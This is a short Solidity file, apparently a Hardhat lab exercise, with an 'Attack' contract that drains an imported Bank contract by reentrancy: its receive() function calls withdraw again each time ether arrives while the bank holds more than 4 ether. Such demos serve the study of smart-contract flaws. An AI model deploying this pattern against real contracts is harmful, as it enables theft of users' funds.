//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./Bank.sol";

// abstract contract Bank {
//     function deposit() public payable virtual;
//     function withdraw(uint _amount) public payable virtual;
// }

contract Attack {
    Bank bank;

    constructor(Bank _bank) {
        bank = Bank(_bank);
    }

    fallback() external payable {
        console.log("attack.fallback");
    }

    receive() external payable {
        if (address(bank).balance > 4 ether) {
            callWithdraw();
        }
    }

    function callWithdraw() public {
        bank.withdraw(1 ether);
    }

    function depositToBank() public {
        bank.deposit{value: 2 ether}();
    }

    function attack() public payable {
        depositToBank();
        callWithdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function deposit() public payable {}
}
